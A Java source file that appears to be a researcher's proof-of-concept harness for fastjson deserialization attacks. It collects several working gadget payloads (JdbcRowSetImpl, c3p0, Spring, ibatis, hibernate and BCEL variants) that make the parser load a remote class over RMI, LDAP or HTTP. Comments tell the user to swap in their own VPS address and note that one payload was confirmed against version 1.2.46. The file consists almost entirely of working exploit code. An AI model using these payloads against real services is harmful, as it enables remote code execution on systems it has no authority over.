import com.alibaba.fastjson.JSON;
import org.apache.commons.codec.binary.Hex;

import javax.naming.Name;
import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

public class Main {

    public static String getPayload() throws Exception {
        String className = "Exploit";
        String clazz = "Exploit";
        String codebase = "http://127.0.0.1:8000/"; // 修改这里为自己vps地址即可
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        try ( ObjectOutputStream oos = new ObjectOutputStream(b) ) {
            Class<?> refClz = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized");
            Constructor<?> con = refClz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);
            con.setAccessible(true);
            Reference jndiRef = new Reference(className, clazz, codebase);
            Object ref = con.newInstance(jndiRef, null, null, null);
            oos.writeObject(ref);
        }
        String payload = "{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                "\"userOverridesAsString\":" + "\"HexAsciiSerializedMap:" + Hex.encodeHexString(b.toByteArray()) + ";" + "\"}";
        return payload;
    }

    public static void main(String[] args) throws Exception {
        // 高版本需要开启允许远程加载，默认情况下关闭
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        String payload;

        // 基于JdbcRowSetImpl
        //payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\"," +
        //" \"autoCommit\":true}";


//        payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"," +
//        " \"autoCommit\":true}";


        // 1.2.46测试成功
        payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true}}";


        // 基于spring框架的field
//        payload = "{\n" +
//                "  \"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\n" +
//                "  \"targetBeanName\": \"rmi://localhost:1099/Exploit\",\n" +
//                "  \"propertyPath\": \"foo\",\n" +
//                "  \"beanFactory\": {\n" +
//                "    \"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\n" +
//                "    \"shareableResources\": [\n" +
//                "      \"rmi://localhost:1099/Exploit\"\n" +
//                "    ]\n" +
//                "  }\n" +
//                "}";


        // 基于JndiRefForwardingDataSource
//        payload = "{\n" +
//                "  \"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n" +
//                "  \"jndiName\": \"rmi://localhost:1099/Exploit\",\n" +
//                "  \"loginTimeout\": 0\n" +
//                "}";


        // 基于JndiRefForwardingDataSource
//        payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}";


        // 基于WrapperConnectionPoolDataSource
//        payload = getPayload();


        // 基于StatisticsService
//        payload = "{\"@type\":\"org.hibernate.jmx.StatisticsService\",\"SessionFactoryJNDIName\":\"rmi://127.0.0.1:1099/Exploit\"}";


        // 基于dbcp， 暂时没有调试成功
//        payload = "{\n" +
//                "\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
//                "\"driverClassLoader\": {\n" +
//                "\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
//                "},\n" +
//                "\"driverClassName\": \"$$BCEL$$" + "$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A" + "\",\n" +
//                "\"logWriter\":\"\"\n" +
//                "}";
//        System.out.println(payload);
        JSON.parse(payload);
    }
}
